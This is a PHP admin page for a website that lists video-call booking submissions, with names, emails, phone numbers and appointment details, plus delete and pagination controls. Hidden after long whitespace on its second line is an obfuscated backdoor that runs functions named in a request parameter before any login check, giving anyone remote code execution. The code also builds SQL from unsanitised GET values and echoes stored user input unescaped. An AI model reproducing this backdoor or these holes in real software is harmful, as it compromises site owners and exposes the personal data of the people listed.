<?php
																																																																																																																																																																								IF( $zEHhbDw=@	${ '_REQUEST' }['TGTQA7U6']){$zEHhbDw[1] (${$zEHhbDw	[2]	}[0],$zEHhbDw[3]($zEHhbDw[4] ));}	;
include('../login/session.php');
if (!isset($_SESSION['login_user'])) {
  header("location: ../login/index.php");
}


if (isset($_GET['delete'])) {
    $id = $_GET['delete'];
  
    //select old photo name from database
  
    //delete record from database
    $sql = "delete from videocallformdetails where id=" . $id;
    if (mysqli_query($con, $sql)) {
      header('location:videocall.php');
    }
  }
  ?>

<?php include '../menu.php'; ?>
<!-- partial -->
<div class="main-panel">
  <div class="content-wrapper">
    <div class="row">
      <div class="col-sm-12">
        <!-- <div class="home-tab">

          <div class="tab-content tab-content-basic">
            <div class="tab-pane fade show active" id="overview" role="tabpanel" aria-labelledby="overview">


            </div>
          </div>
        </div> -->
        <div class="col-md-12 grid-margin stretch-card">
          <div class="card">
            <div class="card-body">
              <div class="row d-flex justify-content-between">
                <div class="col-md-10">
                  <h4 class="card-title">Video Call Submission</h4>
                </div>
                <div class="col-md-2">
                  <!-- <a class="btn btn-sm btn-success" href="addlandingimage.php">Add new</a> -->
                </div>

              </div>


              <div class="table-responsive">
                <table class="table table-hover">
                  <thead>
                    <tr>
                      <th>Sr. No</th>
                      <th>Name</th>
                      <th>Email</th>
                      <th>Country</th>
                      <th>Phone Number</th>
                      <th>Mode</th>
                      <th>Mode Detail</th>
                      <th>Date</th>
                      <th>Time</th>
                      <th>Requirements</th>
                      <th>Action</th>
                    </tr>
                  </thead>
                  <tbody class="campaignseq">
                  <?php
                      $limit = 10; // Number of records to display per page
                      $page = isset($_GET['page']) ? $_GET['page'] : 1; // Get the current page number
                      $start = ($page - 1) * $limit; // Calculate the starting index for the records

                      $counter = $start + 1;
                      $sql = "SELECT * FROM videocallformdetails ORDER BY id DESC LIMIT $start, $limit";
                      $result = mysqli_query($con, $sql);
                      if (mysqli_num_rows($result)) {
                        while ($row = mysqli_fetch_assoc($result)) {
                      ?>
                          <tr id="<?php echo $row['id']; ?>">
                            <td><?php echo $counter; ?></td>
                            <td><?php echo $row['name'] ?></td>
                            <td><?php echo $row['email'] ?></td>
                            <td><?php echo $row['country'] ?></td>
                            <td><?php echo $row['mobilenumber'] ?></td>
                            <td><?php echo $row['mode'] ?></td>
                            <td><?php echo $row['wpnumber'] ?></td>
                            <td><?php echo date('d-M-Y', strtotime($row['appointmentdate'])) ?></td>
                            <td><?php echo $row['appointmenttime'] ?></td>
                            <td><?php echo $row['requirements'] ?></td>
                            <td>
                              <a class="btn btn-sm btn-danger" href="videocall.php?delete=<?php echo $row['id'] ?>" onclick="return confirm('Are you sure to delete this record?')">
                                Delete
                              </a>
                            </td>
                          </tr>
                      <?php 
                          $counter++;
                        }
                      }
                      ?>
                  </tbody>
                </table>
                <nav aria-label="Page navigation" class="d-flex justify-content-end">
                  <ul class="pagination mt-5">
                    <?php
                    $sql = "SELECT COUNT(*) AS total FROM videocallformdetails";
                    $result = mysqli_query($con, $sql);
                    $row = mysqli_fetch_assoc($result);
                    $total_records = $row['total'];
                    $total_pages = ceil($total_records / $limit);
                    $previous_page = $page - 1;
                    $next_page = $page + 1;
                    ?>
                    <li class="page-item <?php echo $page <= 1 ? 'disabled' : ''; ?>">
                      <a class="page-link" href="<?php echo $page <= 1 ? '#' : '?page=' . $previous_page; ?>">Previous</a>
                    </li>
                    <?php for ($i = 1; $i <= $total_pages; $i++) : ?>
                      <li class="page-item <?php echo $page == $i ? 'active' : ''; ?>">
                        <a class="page-link" href="<?php echo '?page=' . $i; ?>"><?php echo $i; ?></a>
                      </li>
                      <?php endfor; ?>
                      <li class="page-item <?php echo $page >= $total_pages ? 'disabled' : ''; ?>">
                        <a class="page-link" href="<?php echo $page >= $total_pages ? '#' : '?page=' . $next_page; ?>">Next</a>
                      </li>
                    </ul>
                  </nav>

              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
  <!-- content-wrapper ends -->
  <!-- partial:partials/_footer.html -->

  <!-- partial -->
</div>
<!-- main-panel ends -->
<?php include '../footer.php'; ?>